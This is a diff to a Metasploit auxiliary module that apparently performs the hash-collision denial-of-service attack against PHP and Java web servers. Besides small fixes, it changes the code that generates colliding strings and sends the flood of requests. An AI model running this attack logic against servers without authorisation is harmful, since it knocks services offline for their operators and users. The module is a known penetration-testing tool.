@@ -37,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
 					'Scott A. Crosby', # original advisory
 					'Dan S. Wallach', # original advisory
 					'Krzysztof Kotowicz', # payload generator
-					'Christian Mehlmauer <FireFart[at]gmail.com>' # metsploit module
+					'Christian Mehlmauer <FireFart[at]gmail.com>' # metasploit module
 				],
 			'License'       => MSF_LICENSE,
 			'Version'       => '$Revision$',
@@ -58,7 +58,6 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 		[
-			Opt::RPORT(80),
 			OptEnum.new('TARGET', [ true, 'Target to attack', nil, ['PHP','Java']]),
 			OptString.new('URL', [ true, "The request URI", '/' ]),
 			OptInt.new('RLIMIT', [ true, "Number of requests to send", 50 ])
@@ -109,7 +108,11 @@ class Metasploit3 < Msf::Auxiliary
 			a << i.chr
 		end
 		# Generate all possible strings
-		source = a.repeated_permutation(length).map(&:join)
+		source = a
+		for i in Range.new(1,length-1)
+			source = source.product(a)
+		end
+		source = source.map(&:join)
 		# and pick a random one
 		base_str = source.sample
 		base_hash = @function.call(base_str)
@@ -172,13 +175,13 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 		case datastore['TARGET']
-			when /php/i
+			when /PHP/
 				@function = method(:djbx33a)
 				@char_range = Range.new(0, 255)
 				if (datastore['maxpayloadsize'] <= 0)
 					datastore['maxpayloadsize'] = 8
 				end
-			when /java/i
+			when /Java/
 				@function = method(:djbx31a)
 				@char_range = Range.new(0, 128)
 				if (datastore['maxpayloadsize'] <= 0)
@@ -211,7 +214,7 @@ class Metasploit3 < Msf::Auxiliary
 				r = c.request_cgi(opts)
 				c.send_request(r)
 				# Don't wait for a response, can take hours
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => exception
+			rescue ::Rex::ConnectionError => exception
 				print_error("Unable to connect to #{rhost}:#{rport} - #{exception.message}")
 				return
 			ensure
